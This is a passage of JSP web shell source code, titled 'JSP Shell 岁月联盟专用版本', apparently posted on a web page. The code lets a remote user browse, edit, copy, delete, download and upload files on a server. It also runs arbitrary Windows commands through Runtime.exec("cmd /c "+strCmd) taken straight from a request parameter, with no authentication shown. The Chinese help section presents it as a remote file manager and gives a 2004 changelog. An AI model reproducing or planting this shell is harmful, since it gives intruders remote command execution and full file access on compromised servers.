c;</span><br><span class="line">   while((c=in1.read(buffer))!=-1)</span><br><span class="line">   &#123;</span><br><span class="line">    out1.write(buffer,0,c);</span><br><span class="line">   &#125;</span><br><span class="line">   in1.close();</span><br><span class="line">   out1.close();</span><br><span class="line"> </span><br><span class="line">   sbSaveCopy.append(&quot;原始文件 ：&quot;+strPath+&quot;&lt;p&gt;&quot;);</span><br><span class="line">   sbSaveCopy.append(&quot;目标文件 ：&quot;+strTmpFile+&quot;&lt;p&gt;&quot;);</span><br><span class="line">   sbSaveCopy.append(&quot;&lt;font color=red&gt;复制成功！&lt;/font&gt;&quot;);   </span><br><span class="line">  &#125;  </span><br><span class="line"> &#125; </span><br><span class="line"> sbSaveCopy.append(&quot;&lt;p&gt;&lt;input type=button name=saveCopyBack onclick=&#x27;history.back(-2);&#x27; value=返回&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(strAction!=null &amp;&amp; strAction.equals(&quot;newFile&quot;))</span><br><span class="line">&#123;</span><br><span class="line"> String strF=request.getParameter(&quot;fileName&quot;);</span><br><span class="line"> String strType1=request.getParameter(&quot;btnNewFile&quot;);</span><br><span class="line"> String strType2=request.getParameter(&quot;btnNewDir&quot;);</span><br><span class="line"> String strType=&quot;&quot;;</span><br><span class="line"> if(strType1==null)</span><br><span class="line"> &#123;</span><br><span class="line">  strType=&quot;Dir&quot;;</span><br><span class="line"> &#125;</span><br><span class="line"> else if(strType2==null)</span><br><span class="line"> &#123;</span><br><span class="line">  strType=&quot;File&quot;;</span><br><span class="line"> &#125;</span><br><span class="line"> if(!strType.equals(&quot;&quot;) &amp;&amp; !(strF==null || strF.equals(&quot;&quot;)))</span><br><span class="line"> &#123;  </span><br><span class="line">   File f_new=new File(strF);   </span><br><span class="line">   if(strType.equals(&quot;File&quot;) &amp;&amp; !f_new.createNewFile())</span><br><span class="line">    sbNewFile.append(strF+&quot; 文件创建失败&quot;);</span><br><span class="line">   if(strType.equals(&quot;Dir&quot;) &amp;&amp; !f_new.mkdirs())</span><br><span class="line">    sbNewFile.append(strF+&quot; 目录创建失败&quot;);</span><br><span class="line"> &#125;</span><br><span class="line"> else</span><br><span class="line"> &#123;</span><br><span class="line">  sbNewFile.append(&quot;&lt;p&gt;&lt;font color=red&gt;建立文件或目录出错。&lt;/font&gt;&quot;);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if((request.getContentType()!= null) &amp;&amp; (request.getContentType().toLowerCase().startsWith(&quot;multipart&quot;)))</span><br><span class="line">&#123;</span><br><span class="line"> String tempdir=&quot;.&quot;;</span><br><span class="line"> boolean error=false;</span><br><span class="line"> response.setContentType(&quot;text/html&quot;);</span><br><span class="line"> sbNewFile.append(&quot;&lt;p&gt;&lt;font color=red&gt;建立文件或目录出错。&lt;/font&gt;&quot;);</span><br><span class="line"> HttpMultiPartParser parser = new HttpMultiPartParser();</span><br><span class="line"></span><br><span class="line"> int bstart = request.getContentType().lastIndexOf(&quot;oundary=&quot;);</span><br><span class="line"> String bound = request.getContentType().substring(bstart + 8);</span><br><span class="line"> int clength = request.getContentLength();</span><br><span class="line"> Hashtable ht = parser.processData(request.getInputStream(), bound, tempdir, clength);</span><br><span class="line"> if (ht.get(&quot;cqqUploadFile&quot;) != null)</span><br><span class="line"> &#123;</span><br><span class="line"></span><br><span class="line">  FileInfo fi = (FileInfo) ht.get(&quot;cqqUploadFile&quot;);</span><br><span class="line">  File f1 = fi.file;</span><br><span class="line">  UplInfo info = UploadMonitor.getInfo(fi.clientFileName);</span><br><span class="line">  if (info != null &amp;&amp; info.aborted) </span><br><span class="line">  &#123;</span><br><span class="line">   f1.delete();</span><br><span class="line">   request.setAttribute(&quot;error&quot;, &quot;Upload aborted&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else </span><br><span class="line">  &#123;</span><br><span class="line">   String path = (String) ht.get(&quot;path&quot;);</span><br><span class="line">   if(path!=null &amp;&amp; !path.endsWith(&quot;\\&quot;)) </span><br><span class="line">    path = path + &quot;\\&quot;;</span><br><span class="line">   if (!f1.renameTo(new File(path + f1.getName()))) </span><br><span class="line">   &#123;</span><br><span class="line">    request.setAttribute(&quot;error&quot;, &quot;Cannot upload file.&quot;);</span><br><span class="line">    error = true;</span><br><span class="line">    f1.delete();</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">td,select,input,body&#123;font-size:9pt;&#125;</span><br><span class="line">A &#123; TEXT-DECORATION: none &#125;</span><br><span class="line"></span><br><span class="line">#tablist&#123;</span><br><span class="line">padding: 5px 0;</span><br><span class="line">margin-left: 0;</span><br><span class="line">margin-bottom: 0;</span><br><span class="line">margin-top: 0.1em;</span><br><span class="line">font:9pt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#tablist li&#123;</span><br><span class="line">list-style: none;</span><br><span class="line">display: inline;</span><br><span class="line">margin: 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#tablist li a&#123;</span><br><span class="line">padding: 3px 0.5em;</span><br><span class="line">margin-left: 3px;</span><br><span class="line">border: 1px solid ;</span><br><span class="line">background: F6F6F6;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#tablist li a:link, #tablist li a:visited&#123;</span><br><span class="line">color: navy;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#tablist li a.current&#123;</span><br><span class="line">background: #EAEAFF;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#tabcontentcontainer&#123;</span><br><span class="line">width: 100%;</span><br><span class="line">padding: 5px;</span><br><span class="line">border: 1px solid black;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.tabcontent&#123;</span><br><span class="line">display:none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line"></span><br><span class="line">var initialtab=[&lt;%=tabID%&gt;, &quot;menu&lt;%=tabID%&gt;&quot;]</span><br><span class="line"></span><br><span class="line">////////Stop editting////////////////</span><br><span class="line"></span><br><span class="line">function cascadedstyle(el, cssproperty, csspropertyNS)&#123;</span><br><span class="line">if (el.currentStyle)</span><br><span class="line">return el.currentStyle[cssproperty]</span><br><span class="line">else if (window.getComputedStyle)&#123;</span><br><span class="line">var elstyle=window.getComputedStyle(el, &quot;&quot;)</span><br><span class="line">return elstyle.getPropertyValue(csspropertyNS)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var previoustab=&quot;&quot;</span><br><span class="line"></span><br><span class="line">function expandcontent(cid, aobject)&#123;</span><br><span class="line">if (document.getElementById)&#123;</span><br><span class="line">highlighttab(aobject)</span><br><span class="line">if (previoustab!=&quot;&quot;)</span><br><span class="line">document.getElementById(previoustab).style.display=&quot;none&quot;</span><br><span class="line">document.getElementById(cid).style.display=&quot;block&quot;</span><br><span class="line">previoustab=cid</span><br><span class="line">if (aobject.blur)</span><br><span class="line">aobject.blur()</span><br><span class="line">return false</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">return true</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function highlighttab(aobject)&#123;</span><br><span class="line">if (typeof tabobjlinks==&quot;undefined&quot;)</span><br><span class="line">collecttablinks()</span><br><span class="line">for (i=0; i&lt;tabobjlinks.length; i++)</span><br><span class="line">tabobjlinks[i].style.backgroundColor=initTabcolor</span><br><span class="line">var themecolor=aobject.getAttribute(&quot;theme&quot;)? aobject.getAttribute(&quot;theme&quot;) : initTabpostcolor</span><br><span class="line">aobject.style.backgroundColor=document.getElementById(&quot;tabcontentcontainer&quot;).style.backgroundColor=themecolor</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function collecttablinks()&#123;</span><br><span class="line">var tabobj=document.getElementById(&quot;tablist&quot;)</span><br><span class="line">tabobjlinks=tabobj.getElementsByTagName(&quot;A&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function do_onload()&#123;</span><br><span class="line">collecttablinks()</span><br><span class="line">initTabcolor=cascadedstyle(tabobjlinks[1], &quot;backgroundColor&quot;, &quot;background-color&quot;)</span><br><span class="line">initTabpostcolor=cascadedstyle(tabobjlinks[0], &quot;backgroundColor&quot;, &quot;background-color&quot;)</span><br><span class="line">expandcontent(initialtab[1], tabobjlinks[initialtab[0]-1])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (window.addEventListener)</span><br><span class="line">window.addEventListener(&quot;load&quot;, do_onload, false)</span><br><span class="line">else if (window.attachEvent)</span><br><span class="line">window.attachEvent(&quot;onload&quot;, do_onload)</span><br><span class="line">else if (document.getElementById)</span><br><span class="line">window.onload=do_onload</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script language=&quot;javascript&quot;&gt;</span><br><span class="line"></span><br><span class="line">function doForm(action,path,file,cmd,tab,content)</span><br><span class="line">&#123;</span><br><span class="line"> document.frmCqq.action.value=action;</span><br><span class="line"> document.frmCqq.path.value=path;</span><br><span class="line"> document.frmCqq.file.value=file;</span><br><span class="line"> document.frmCqq.cmd.value=cmd;</span><br><span class="line"> document.frmCqq.tabID.value=tab;</span><br><span class="line"> document.frmCqq.content.value=content;</span><br><span class="line"> if(action==&quot;del&quot;)</span><br><span class="line"> &#123;</span><br><span class="line">  if(confirm(&quot;确定要删除文件 &quot;+file+&quot; 吗？&quot;))</span><br><span class="line">  document.frmCqq.submit();</span><br><span class="line"> &#125;</span><br><span class="line"> else</span><br><span class="line"> &#123;</span><br><span class="line">  document.frmCqq.submit();    </span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;title&gt;JSP Shell 岁月联盟专用版本&lt;/title&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form name=&quot;frmCqq&quot; method=&quot;post&quot; action=&quot;&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;path&quot; value=&quot;&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;file&quot; value=&quot;&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;cmd&quot; value=&quot;&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;tabID&quot; value=&quot;2&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;content&quot; value=&quot;&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--Top Menu Started--&gt;</span><br><span class="line">&lt;ul id=&quot;tablist&quot;&gt;</span><br><span class="line">&lt;li&gt;&lt;a href=&quot;&quot; class=&quot;current&quot; onClick=&quot;return expandcontent(&#x27;menu1&#x27;, this)&quot;&gt; &lt;%=strFileManage[languageNo]%&gt; &lt;/a&gt;&lt;/li&gt;</span><br><span class="line">&lt;li&gt;&lt;a href=&quot;new.htm&quot; onClick=&quot;return expandcontent(&#x27;menu2&#x27;, this)&quot; theme=&quot;#EAEAFF&quot;&gt; &lt;%=strCommand[languageNo]%&gt; &lt;/a&gt;&lt;/li&gt;</span><br><span class="line">&lt;li&gt;&lt;a href=&quot;hot.htm&quot; onClick=&quot;return expandcontent(&#x27;menu3&#x27;, this)&quot; theme=&quot;#EAEAFF&quot;&gt; &lt;%=strSysProperty[languageNo]%&gt; &lt;/a&gt;&lt;/li&gt;</span><br><span class="line">&lt;li&gt;&lt;a href=&quot;search.htm&quot; onClick=&quot;return expandcontent(&#x27;menu4&#x27;, this)&quot; theme=&quot;#EAEAFF&quot;&gt; &lt;%=strHelp[languageNo]%&gt; &lt;/a&gt;&lt;/li&gt;</span><br><span class="line"> &amp;nbsp; &lt;%=authorInfo[languageNo]%&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;!--Top Menu End--&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">StringBuffer sbFolder=new StringBuffer(&quot;&quot;);</span><br><span class="line">StringBuffer sbFile=new StringBuffer(&quot;&quot;);</span><br><span class="line">try</span><br><span class="line">&#123;</span><br><span class="line"> File objFile = new File(strDir);</span><br><span class="line"> File list[] = objFile.listFiles(); </span><br><span class="line"> if(objFile.getAbsolutePath().length()&gt;3)</span><br><span class="line"> &#123;</span><br><span class="line">  sbFolder.append(&quot;&lt;tr&gt;&lt;td &gt;&amp;nbsp;&lt;/td&gt;&lt;td&gt;&lt;a href=\&quot;javascript:doForm(&#x27;&#x27;,&#x27;&quot;+formatPath(objFile.getParentFile().getAbsolutePath())+&quot;&#x27;,&#x27;&#x27;,&#x27;&quot;+strCmd+&quot;&#x27;,&#x27;1&#x27;,&#x27;&#x27;);\&quot;&gt;&quot;);</span><br><span class="line">  sbFolder.append(strParentFolder[languageNo]+&quot;&lt;/a&gt;&lt;br&gt;- - - - - - - - - - - &lt;/td&gt;&lt;/tr&gt;\r\n &quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"> for(int i=0;i&lt;list.length;i++)</span><br><span class="line"> &#123;</span><br><span class="line">  if(list[i].isDirectory())</span><br><span class="line">  &#123;</span><br><span class="line">   sbFolder.append(&quot;&lt;tr&gt;&lt;td &gt;&amp;nbsp;&lt;/td&gt;&lt;td&gt;&quot;);</span><br><span class="line">   sbFolder.append(&quot;  &lt;a href=\&quot;javascript:doForm(&#x27;&#x27;,&#x27;&quot;+formatPath(list[i].getAbsolutePath())+&quot;&#x27;,&#x27;&#x27;,&#x27;&quot;+strCmd+&quot;&#x27;,&#x27;1&#x27;,&#x27;&#x27;);\&quot;&gt;&quot;);</span><br><span class="line">   sbFolder.append(list[i].getName()+&quot;&lt;/a&gt;&lt;br&gt;&lt;/td&gt;&lt;/tr&gt; &quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">      String strLen=&quot;&quot;;</span><br><span class="line">   String strDT=&quot;&quot;;</span><br><span class="line">   long lFile=0;</span><br><span class="line">   lFile=list[i].length();</span><br><span class="line">   strLen = convertFileSize(lFile);</span><br><span class="line">   Date dt=new Date(list[i].lastModified());</span><br><span class="line">   strDT=dt.toLocaleString();</span><br><span class="line">   sbFile.append(&quot;&lt;tr onmouseover=\&quot;this.style.backgroundColor=&#x27;#FBFFC6&#x27;\&quot; onmouseout=\&quot;this.style.backgroundColor=&#x27;white&#x27;\&quot;&gt;&lt;td&gt;&quot;);</span><br><span class="line">   sbFile.append(&quot;&quot;+list[i].getName()); </span><br><span class="line">   sbFile.append(&quot;&lt;/td&gt;&lt;td&gt;&quot;);</span><br><span class="line">   sbFile.append(&quot;&quot;+strLen);</span><br><span class="line">   sbFile.append(&quot;&lt;/td&gt;&lt;td&gt;&quot;);</span><br><span class="line">   sbFile.append(&quot;&quot;+strDT);</span><br><span class="line">   sbFile.append(&quot;&lt;/td&gt;&lt;td&gt;&quot;);</span><br><span class="line"></span><br><span class="line">   sbFile.append(&quot; &amp;nbsp;&lt;a href=\&quot;javascript:doForm(&#x27;edit&#x27;,&#x27;&quot;+formatPath(strDir)+&quot;&#x27;,&#x27;&quot;+list[i].getName()+&quot;&#x27;,&#x27;&quot;+strCmd+&quot;&#x27;,&#x27;&quot;+tabID+&quot;&#x27;,&#x27;&#x27;);\&quot;&gt;&quot;);</span><br><span class="line">   sbFile.append(strFileEdit[languageNo]+&quot;&lt;/a&gt; &quot;);</span><br><span class="line"></span><br><span class="line">   sbFile.append(&quot; &amp;nbsp;&lt;a href=\&quot;javascript:doForm(&#x27;del&#x27;,&#x27;&quot;+formatPath(strDir)+&quot;&#x27;,&#x27;&quot;+list[i].getName()+&quot;&#x27;,&#x27;&quot;+strCmd+&quot;&#x27;,&#x27;&quot;+tabID+&quot;&#x27;,&#x27;&#x27;);\&quot;&gt;&quot;);</span><br><span class="line">   sbFile.append(strFileDel[languageNo]+&quot;&lt;/a&gt; &quot;);</span><br><span class="line"></span><br><span class="line">   sbFile.append(&quot;  &amp;nbsp;&lt;a href=\&quot;javascript:doForm(&#x27;down&#x27;,&#x27;&quot;+formatPath(strDir)+&quot;&#x27;,&#x27;&quot;+list[i].getName()+&quot;&#x27;,&#x27;&quot;+strCmd+&quot;&#x27;,&#x27;&quot;+tabID+&quot;&#x27;,&#x27;&#x27;);\&quot;&gt;&quot;);</span><br><span class="line">   sbFile.append(strFileDown[languageNo]+&quot;&lt;/a&gt; &quot;);</span><br><span class="line"></span><br><span class="line">   sbFile.append(&quot;  &amp;nbsp;&lt;a href=\&quot;javascript:doForm(&#x27;copy&#x27;,&#x27;&quot;+formatPath(strDir)+&quot;&#x27;,&#x27;&quot;+list[i].getName()+&quot;&#x27;,&#x27;&quot;+strCmd+&quot;&#x27;,&#x27;&quot;+tabID+&quot;&#x27;,&#x27;&#x27;);\&quot;&gt;&quot;);</span><br><span class="line">   sbFile.append(strFileCopy[languageNo]+&quot;&lt;/a&gt; &quot;);</span><br><span class="line">  &#125;  </span><br><span class="line"></span><br><span class="line"> &#125; </span><br><span class="line">&#125;</span><br><span class="line">catch(Exception e)</span><br><span class="line">&#123;</span><br><span class="line"> out.println(&quot;&lt;font color=red&gt;操作失败： &quot;+e.toString()+&quot;&lt;/font&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;DIV id=&quot;tabcontentcontainer&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;menu3&quot; class=&quot;tabcontent&quot;&gt;</span><br><span class="line">&lt;br&gt; </span><br><span class="line">&lt;br&gt; &amp;nbsp;&amp;nbsp; 未完成</span><br><span class="line">&lt;br&gt; </span><br><span class="line">&lt;br&gt;&amp;nbsp;</span><br><span class="line"></span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;menu4&quot; class=&quot;tabcontent&quot;&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;p&gt;一、功能说明&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; jsp 版本的文件管理器，通过该程序可以远程管理服务器上的文件系统，您可以新建、修改、&lt;/p&gt;</span><br><span class="line">&lt;p&gt;删除、下载文件和目录。对于windows系统，还提供了命令行窗口的功能，可以运行一些程序，类似&lt;/p&gt;</span><br><span class="line">&lt;p&gt;与windows的cmd。&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&amp;nbsp;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;二、测试&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;b&gt;请大家在使用过程中，有任何问题，意见或者建议都可以给我留言，以便使这个程序更加完善和稳定，&lt;p&gt;</span><br><span class="line">留言地址为：&lt;a href=&quot;http://&quot; target=&quot;_blank&quot;&gt;&lt;/a&gt;&lt;/b&gt;</span><br><span class="line">&lt;p&gt;&amp;nbsp;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;三、更新记录&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 2004.11.15&amp;nbsp; V0.9测试版发布，增加了一些基本的功能，文件编辑、复制、删除、下载、上传以及新建文件目录功能&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 2004.10.27&amp;nbsp; 暂时定为0.6版吧， 提供了目录文件浏览功能 和 cmd功能&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 2004.09.20&amp;nbsp; 第一个jsp&amp;nbsp;程序就是这个简单的显示目录文件的小程序&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&amp;nbsp;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&amp;nbsp;&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;menu1&quot; class=&quot;tabcontent&quot;&gt;</span><br><span class="line">&lt;%</span><br><span class="line">out.println(&quot;&lt;table border=&#x27;1&#x27; width=&#x27;100%&#x27; bgcolor=&#x27;#FBFFC6&#x27; cellspacing=0 cellpadding=5 bordercolorlight=#000000 bordercolordark=#FFFFFF&gt;&lt;tr&gt;&lt;td width=&#x27;30%&#x27;&gt;&quot;+strCurrentFolder[languageNo]+&quot;： &lt;b&gt;&quot;+strDir+&quot;&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&quot; + getDrivers() + &quot;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;\r\n&quot;);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;table width=&quot;100%&quot; border=&quot;1&quot; cellspacing=&quot;0&quot; cellpadding=&quot;5&quot; bordercolorlight=&quot;#000000&quot; bordercolordark=&quot;#FFFFFF&quot;&gt;</span><br><span class="line">       </span><br><span class="line">        &lt;tr&gt; </span><br><span class="line">          &lt;td width=&quot;25%&quot; align=&quot;center&quot; valign=&quot;top&quot;&gt; </span><br><span class="line">              &lt;table width=&quot;98%&quot; border=&quot;0&quot; cellspacing=&quot;0&quot; cellpadding=&quot;3&quot;&gt;</span><br><span class="line">     &lt;%=sbFolder%&gt;</span><br><span class="line">                &lt;/tr&gt;                 </span><br><span class="line">              &lt;/table&gt;</span><br><span class="line">          &lt;/td&gt;</span><br><span class="line">          &lt;td width=&quot;81%&quot; align=&quot;left&quot; valign=&quot;top&quot;&gt;</span><br><span class="line"> </span><br><span class="line"> &lt;%</span><br><span class="line"> if(strAction!=null &amp;&amp; strAction.equals(&quot;edit&quot;))</span><br><span class="line"> &#123;</span><br><span class="line">  out.println(sbEdit.toString());</span><br><span class="line"> &#125;</span><br><span class="line"> else if(strAction!=null &amp;&amp; strAction.equals(&quot;copy&quot;))</span><br><span class="line"> &#123;</span><br><span class="line">  out.println(sbCopy.toString());</span><br><span class="line"> &#125;</span><br><span class="line"> else if(strAction!=null &amp;&amp; strAction.equals(&quot;down&quot;))</span><br><span class="line"> &#123;</span><br><span class="line">  out.println(sbDown.toString());</span><br><span class="line"> &#125;</span><br><span class="line"> else if(strAction!=null &amp;&amp; strAction.equals(&quot;savecopy&quot;))</span><br><span class="line"> &#123;</span><br><span class="line">  out.println(sbSaveCopy.toString());</span><br><span class="line"> &#125;</span><br><span class="line"> else if(strAction!=null &amp;&amp; strAction.equals(&quot;newFile&quot;) &amp;&amp; !sbNewFile.toString().equals(&quot;&quot;))</span><br><span class="line"> &#123;</span><br><span class="line">  out.println(sbNewFile.toString());</span><br><span class="line"> &#125;</span><br><span class="line"> else</span><br><span class="line"> &#123;</span><br><span class="line"> %&gt;</span><br><span class="line">  &lt;span id=&quot;EditBox&quot;&gt;&lt;table width=&quot;98%&quot; border=&quot;1&quot; cellspacing=&quot;1&quot; cellpadding=&quot;4&quot; bordercolorlight=&quot;#cccccc&quot; bordercolordark=&quot;#FFFFFF&quot; bgcolor=&quot;white&quot; &gt;</span><br><span class="line">              &lt;tr bgcolor=&quot;#E7e7e6&quot;&gt; </span><br><span class="line">                &lt;td width=&quot;26%&quot;&gt;&lt;%=strFileName[languageNo]%&gt;&lt;/td&gt;</span><br><span class="line">                &lt;td width=&quot;19%&quot;&gt;&lt;%=strFileSize[languageNo]%&gt;&lt;/td&gt;</span><br><span class="line">                &lt;td width=&quot;29%&quot;&gt;&lt;%=strLastModified[languageNo]%&gt;&lt;/td&gt;</span><br><span class="line">                &lt;td width=&quot;26%&quot;&gt;&lt;%=strFileOperation[languageNo]%&gt;&lt;/td&gt;</span><br><span class="line">              &lt;/tr&gt;              </span><br><span class="line">            &lt;%=sbFile%&gt;</span><br><span class="line">             &lt;!-- &lt;tr align=&quot;center&quot;&gt; </span><br><span class="line">                &lt;td colspan=&quot;4&quot;&gt;&lt;br&gt;</span><br><span class="line">                  总计文件个数：&lt;font color=&quot;#FF0000&quot;&gt;30&lt;/font&gt; ，大小：&lt;font color=&quot;#FF0000&quot;&gt;664.9&lt;/font&gt; </span><br><span class="line">                  KB &lt;/td&gt;</span><br><span class="line">              &lt;/tr&gt;</span><br><span class="line">    --&gt;</span><br><span class="line">            &lt;/table&gt;</span><br><span class="line">   &lt;/span&gt;</span><br><span class="line"> &lt;%</span><br><span class="line"> &#125;  </span><br><span class="line"> %&gt;</span><br><span class="line"></span><br><span class="line">          &lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line"></span><br><span class="line"> &lt;form name=&quot;frmMake&quot; action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line"> &lt;tr&gt;&lt;td colspan=2 bgcolor=#FBFFC6&gt;</span><br><span class="line"> &lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;newFile&quot;&gt;</span><br><span class="line"> &lt;input type=&quot;hidden&quot; name=&quot;path&quot; value=&quot;&lt;%=strDir%&gt;&quot;&gt;</span><br><span class="line"> &lt;input type=&quot;hidden&quot; name=&quot;file&quot; value=&quot;&lt;%=strFile%&gt;&quot;&gt;</span><br><span class="line"> &lt;input type=&quot;hidden&quot; name=&quot;cmd&quot; value=&quot;&lt;%=strCmd%&gt;&quot;&gt;</span><br><span class="line"> &lt;input type=&quot;hidden&quot; name=&quot;tabID&quot; value=&quot;1&quot;&gt;</span><br><span class="line"> &lt;input type=&quot;hidden&quot; name=&quot;content&quot; value=&quot;&quot;&gt;</span><br><span class="line"> &lt;%</span><br><span class="line"> if(!strDir.endsWith(&quot;\\&quot;))</span><br><span class="line"> strDir = strDir + &quot;\\&quot;;</span><br><span class="line"> %&gt;</span><br><span class="line"> &lt;input type=&quot;text&quot; name=&quot;fileName&quot; size=36 value=&quot;&lt;%=strDir%&gt;&quot;&gt;</span><br><span class="line"> &lt;input type=&quot;submit&quot; name=&quot;btnNewFile&quot; value=&quot;新建文件&quot; onclick=&quot;frmMake.submit()&quot; &gt; </span><br><span class="line"> &lt;input type=&quot;submit&quot; name=&quot;btnNewDir&quot; value=&quot;新建目录&quot;  onclick=&quot;frmMake.submit()&quot; &gt; </span><br><span class="line"> &lt;/form&gt;  </span><br><span class="line"> &lt;form name=&quot;frmUpload&quot; enctype=&quot;multipart/form-data&quot; action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line"> &lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;upload&quot;&gt;</span><br><span class="line"> &lt;input type=&quot;hidden&quot; name=&quot;path&quot; value=&quot;&lt;%=strDir%&gt;&quot;&gt;</span><br><span class="line"> &lt;input type=&quot;hidden&quot; name=&quot;file&quot; value=&quot;&lt;%=strFile%&gt;&quot;&gt;</span><br><span class="line"> &lt;input type=&quot;hidden&quot; name=&quot;cmd&quot; value=&quot;&lt;%=strCmd%&gt;&quot;&gt;</span><br><span class="line"> &lt;input type=&quot;hidden&quot; name=&quot;tabID&quot; value=&quot;1&quot;&gt;</span><br><span class="line"> &lt;input type=&quot;hidden&quot; name=&quot;content&quot; value=&quot;&quot;&gt;</span><br><span class="line"> &lt;input type=&quot;file&quot; name=&quot;cqqUploadFile&quot; size=&quot;36&quot;&gt;</span><br><span class="line"> &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot;&gt;</span><br><span class="line"> &lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;</span><br><span class="line">      &lt;/table&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div id=&quot;menu2&quot; class=&quot;tabcontent&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">String line=&quot;&quot;;</span><br><span class="line">StringBuffer sbCmd=new StringBuffer(&quot;&quot;);</span><br><span class="line"></span><br><span class="line">if(strCmd!=null) </span><br><span class="line">&#123;</span><br><span class="line"> try</span><br><span class="line"> &#123;</span><br><span class="line">  //out.println(strCmd);</span><br><span class="line">  Process p=Runtime.getRuntime().exec(&quot;cmd /c &quot;+strCmd);</span><br><span class="line">  BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));</span><br><span class="line">  while((line=br.readLine())!=null)</span><br><span class="line">  &#123;</span><br><span class="line">   sbCmd.append(line+&quot;\r\n&quot;);  </span><br><span class="line">  &#125;    </span><br><span class="line"> &#125;</span><br><span class="line"> catch(Exception e)</span><br><span class="line"> &#123;</span><br><span class="line">  System.out.println(e.toString());</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line"> strCmd = &quot;set&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line">&lt;form name=&quot;cmd&quot; action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">&amp;nbsp;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;cmd&quot; value=&quot;&lt;%=strCmd%&gt;&quot; size=50&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;tabID&quot; value=&quot;2&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit 